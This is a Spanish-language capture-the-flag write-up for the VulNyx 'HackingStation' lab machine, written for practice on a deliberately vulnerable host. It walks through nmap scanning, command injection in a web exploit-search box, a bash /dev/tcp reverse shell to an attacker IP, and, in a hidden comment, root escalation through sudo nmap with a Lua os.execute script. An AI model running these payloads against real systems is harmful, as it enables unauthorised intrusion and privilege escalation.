# WRITEUP - HACKINGSTATTION - VULNYX #
![image](https://github.com/AlexGis99/Writeups/assets/82893511/34eb39b4-93b9-49b7-b8e5-30dc668567f9)
### Recon/Scanning network: ###
Empezamos identificando el activo víctima a explotar dentro de nuestra red con un reconocimiento completo de ella:
```shell
$ netdiscover -r 10.0.2.0/24
```
~~Meter imagen del resultado~~  
Identificamos la ip de nuestra víctima, ahora podemos empezar a escanear el activo para identificar posibles vectores de entrada.  
Ejecutamos un escaneo con nmap en el que escaneamos todos los 65535 puertos (-p-), que nos identifique todos aquellos puertos abiertos (--open), con un ratio mínimo de 5000 paquetes por segundo (--min-rate 5000), sin resolución DNS (-n) y sin host discovery (-Pn). [First scan](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/HackingStation/nmap/first-scan).
```console
$ nmap -p- --open --min-rate 5000 -n -Pn 10.0.2.6
```
```shell
Nmap scan report for 10.0.2.6
Host is up (0.00059s latency).
Not shown: 44294 closed tcp ports (reset), 21240 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:E1:40:2F (Oracle VirtualBox virtual NIC)

# Nmap done at Thu Apr 18 13:31:48 2024 -- 1 IP address (1 host up) scanned in 18.70 seconds
```
Observamos que solo existe un puerto abierto con el escaneo realizado, por lo que vamos a ejecutar un escaneo sobre servicios y con unos scripts por defecto para el análisis. [Scan services](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/HackingStation/nmap/scan-services).
```shell
$ nmap -p80 -sVC 10.0.2.6 
```
```shell
Nmap scan report for 10.0.2.6
Host is up (0.00069s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: HackingStation
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:E1:40:2F (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 18 13:33:06 2024 -- 1 IP address (1 host up) scanned in 6.94 seconds
```
### Enumeration ###
Como podemos comprobar, tiene un servicio HTTP con un apache 2.4.57, el cuál si buscamos un poco de información, podemos ver que está relacionado con el CVE-2023-31122, el cuál nos permite ejecutar un RCE (Remote Command Execution), no indagaremos más por ahora sobre está vulnerabilidad pero está bien tenerla en mente.  
Teniendo este servicio web, podemos dejar un dirbuster ejecutando mientras nosotros analizamos de forma manual el servicio web. [Dirbuster](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/HackingStation/enumeration/dirbuster_80).
```shell
$ dirb http://10.0.2.6:80
```
Dejamos la ejecución de dirbuster corriendo y mientras vamos a echar un vistazo al servicio web. Al entrar con el navegador, podemos ver la página principal. Este servicio web parece tener la funcionalidad de ser un repositorio de exploits en el que se pueden buscar mediante el cuadro de texto abajo. Al ver este cuadro de texto habilitado, podemos empezar a probar cualquier Injección de Comandos para ver si es vulnerable o no.   
~~Imagen página web~~  
### Exploitation ###
Antes de empezar a inyectar comandos, podemos buscar por ejemplo qué vulnerabilidades tiene apache 2.4.57 y ver el funcionamiento del servicio.  
~~Imagen búsqueda apache~~  
Identificamos que el servicio ejecuta un archivo php para hacer la búsqueda llamado queryExploit.php. Gracias a esto, ya sabemos que el servicio web usa por debajo php y nos sirve para hacer inyecciones en php o relacionado. Podemos probar a ejecutar dentro del cuadro de búsqueda de la página principal comandos como:
- PHP:
	- ";exec("ls")
 	- ';exec("ls")
  	- ");exec("ls")
  	- ');exec("ls")
- SQL:
	- '; select * --
- JS:
	- ;alert("Hacked")
 	- ";alert("Hacked")
  	- ';alert("Hacked")
  	- ");alert("Hacked")
  	- ');alert("hacked")
Pero ninguno de estos intentos nos va a funcionar. Si analizamos un poco la respuesta del servidor, observamos que nos referencia un path en el que se encuentra el posible repositorio en el que se apoya el servicio web, siendo este path: */opt/snap/core22/searchsploit/298/*. Esto nos puede dar una pista de que el comando que se está ejecutando al buscar el exploit dentro del repositorio, es un comando de sistema y al saber que estamos aparentemente ante un sistema Debian (Linux) por el escaneo de servicios realizado anteriormete, podemos probar a ejecutar comandos de sistema. Por ejemplo vamos a ejecutar un *whoami* para ver si esto es posible:
~~Imagen búsqueda~~
Al ejecutar esto, vemos que al final de la página, nos devuelve "hacker". Podemos confirmar que este es el método que está utilizando el servicio por dentro y acabamos de ejecutar un comando de forma remota en el sistema.  
~~Imagen resultado~~
### Gaining access ###
Una vez comprobado esto, vamos a enviarnos una reverse shell para conseguir conectarnos con una terminal y poder seguir con la intrusión de forma más sencilla y cómoda. Para esto dejamos nuestra máquina a la escucha por un puerto aleatorio, por ejemplo, 443, a la espera de una conexión.
```shell
$ nc -nlsvp 443
```
Mientras, hacemos una búsqueda ejecutando una reverse shell sobre el servicio web con: *;bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'* y ejecutamos.  
Acabamos de recibir una shell con el usuario hacker sobre la máquina víctima.  
~~Imagen intrusion~~  
Tenemos una shell, pero debemos realizar un tratamiento adecuado de la shell para que nos resulte más cómodo:
```shell
$ script /dev/null -c bash
$ ctrl+z
$ stty raw -echo;fg
$ reset xterm
$ export TERM=xterm
$ export SHELL=bash
```
Recibimos una shell tratada. 
<!-- ~~Machine:
	HackingStation:
	netdiscover -r 10.0.2.0/24
	nmap first
	nmap services
	Solo puerto 80, miramos la pág:
		CVE apache 2.4.57 -> CVE-2023-31122
		Dejamos ejecutando un dirb sobre el servicio, mientras examinamos a mano la web
		Primer intento de xss con <script>alert("Hacked")</script>, no nos devuelve nada pero obtenemos un archivo en php que ejecuta un comando
		Vemos el archivo php y parece ser una base de datos de exploit-db, si buscamos por ejemplo la versión de apache, nos aparecen diferentes entradas
		Dentro de las entradas, aparece un "Apache + php - remote code execution + scanner"
			https://www.exploit-db.com/exploits/29316
		Al saber que es php y no ver un tratamiento en principio de la entrada, vamos a probar a ejecutar un ls
			apache 2.4.57;exec("ls")
			Sin exito
		Vamos al dirbuster y vemos que hay una página a la que podemos acceder:
			10.0.2.6/javascript/jquery/jquery
		Seguimos probando por la parte del input, esta vez simplemente con bash
			apache 2.4.57;whoami
			Nos responde e server devolviendonos el usuario con el que se ejecuta esto "hacker". Hecho esto vamos a mandarnos una reverse shell
				nc -nlvp 443
				Ejecutamos en el botón o con un curl la reverse shell en bash:
					bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'
			Estamkos dentro, vamos a hacer una conversion de tty
				script /dev/null -c bash
				ctrl+z
				stty raw -echo;fg
				reset xterm
				export TERM=xterm
				export SHELL=bash
		Escalamos privilegios:
			id (Poca información)
			sudo -l
				Vemos que tenemos un binario "nmap" en /usr/bin/nmap el que podemos ejecutar usar con sudo
				sudo /usr/bin/nmap 127.0.0.1
				Vemos que tiene ssh activado, pero en nuestro scan no nos aparecía. Esto es debido a que estará de forma interna. El uso
				es el usual de nmap. 
				Sabemos que con nmap, podemos ejecutar scripts, vamos a intentar crear de alguna manera un script que nos devuelva una shell como root.
				Para eso buscamos y encontramos GTFO bins, dentro de ella podemos encontrar una entrada a nmap. Vemos que con una version de nmap inferior
				a la que tiene el sistema, podríamos haber iniciado una shell interactiva con: nmap --interactive. Pero nuestra version supera a las vulnerables
				En vez de usar una sh como nos indica en el GTFObins, vamos a intentar que nos devuelva una bash:
					BASH=$(mktemp)
					echo 'os.execute("/bin/bash")' > $BASH
					sudo nmap --script=$BASH
				Tenemos acceso como root. Aunque no aparezca cuando escribimos, el comando se ejecuta. Para hacerlo más comodo podemos enviarnos
				una reverse shell como root, o activar ssh y establecer por ahí una conexión (vemos como de verdad tiene ssh abierto pero solo en modo
				escucha). De todas formas en el home de root, tenemos su flag~~
